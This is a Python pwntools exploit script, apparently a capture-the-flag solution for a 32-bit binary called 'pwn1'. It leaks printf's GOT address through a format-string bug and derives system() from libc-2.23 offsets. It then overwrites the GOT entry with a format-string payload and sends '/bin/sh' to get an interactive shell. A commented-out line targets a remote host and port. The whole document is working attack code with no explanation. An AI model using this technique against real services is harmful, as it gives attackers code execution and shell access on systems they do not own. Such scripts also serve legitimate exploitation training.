from pwn import *

#context.log_level = 'debug'

p = process('./pwn1')
#p = remote("115.28.185.220", 11111)
#context.terminal = ['gnome-terminal','-x','sh','-c']
#gdb.attach(proc.pidof(p)[0])

elf = ELF("pwn1")
#lib_elf = ELF('libc32.so')
lib_elf = ELF('libc-2.23.so')

printf_got_addr = elf.got['printf']
system_offset = lib_elf.symbols['system']
printf_offset = lib_elf.symbols['printf']
print 'printf_got_addr = ' + hex(printf_got_addr)

# Firstly, get entry of printf() so as to calc entry of system() 
p.sendline(str(1))
p.sendline(p32(printf_got_addr) + '[%6$.4s]')
p.recvuntil('[')
printf_entry = u32(p.recv(4))
system_entry = printf_entry - (printf_offset - system_offset)
print 'printf_entry = ' + hex(printf_entry)
print 'system_entry = ' + hex(system_entry)

# Secondly, replace entry of printf() with entry of system()
p.sendline(str(1))

payload = ''
payload = fmtstr_payload(6,
		{printf_got_addr:system_entry},
		numbwritten=len(payload),
		write_size='byte')

'''
cb = system_entry
a3 = (cb >> 24) & 0xff
a2 = (cb >> 16) & 0xff
a1 = (cb >> 8) & 0xff
a0 = cb & 0xff
print 'a0-16= ' + str(a0-16)
print 'a1-a0= ' + str(a1-a0)
print 'a2-a1= ' + str(a2-a1)
print 'a3-a2= ' + str(a3-a2)

payload = p32(printf_got_addr) + p32(printf_got_addr+1)
payload += p32(printf_got_addr+2) + p32(printf_got_addr+3)
payload += '%' + str((a0-16)%0x100) + 'x%6$n'
payload += '%' + str((a1-a0)%0x100) + 'x%7$n'
payload += '%' + str((a2-a1)%0x100) + 'x%8$n'
payload += '%' + str((a3-a2)%0x100) + 'x%9$n'
'''
p.sendline(payload)

# Thirdly, get shell
p.sendline(str(1))
p.sendline('/bin/sh')

p.interactive()
